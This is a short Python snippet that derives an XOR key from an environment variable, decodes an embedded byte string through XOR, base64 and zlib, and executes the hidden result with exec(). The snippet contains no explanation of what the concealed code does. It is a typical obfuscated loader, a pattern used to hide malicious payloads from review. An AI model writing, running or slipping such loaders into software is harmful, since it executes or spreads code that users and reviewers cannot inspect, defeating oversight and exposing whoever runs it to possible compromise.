import base64, os, zlib
_seed = os.environ.get('PYDECOMP_SEED', 'A')
_key = ord(_seed[0]) ^ 0x5C
_p = b'xWeKwvXVjd\\LO{xxDsDpXRVtJLv(OL%zTO/WD[L~uHQT.|Smv{GkGkU6{%el[dW)TmUeIwTrx|XZmDjgN|pR-Rr_Sv$mzR_wpl{m-E$+SOJMq~W%q2(_UOOLY/klUR,i2\x7f[XIYv+-UeQVG\\H)pwxHe(SyLoRJ[Xn/K\x7fi$6pR).kGz%Ke$Ikk/LHkhXYp'
exec(zlib.decompress(base64.b64decode(bytes(b ^ _key for b in _p))))
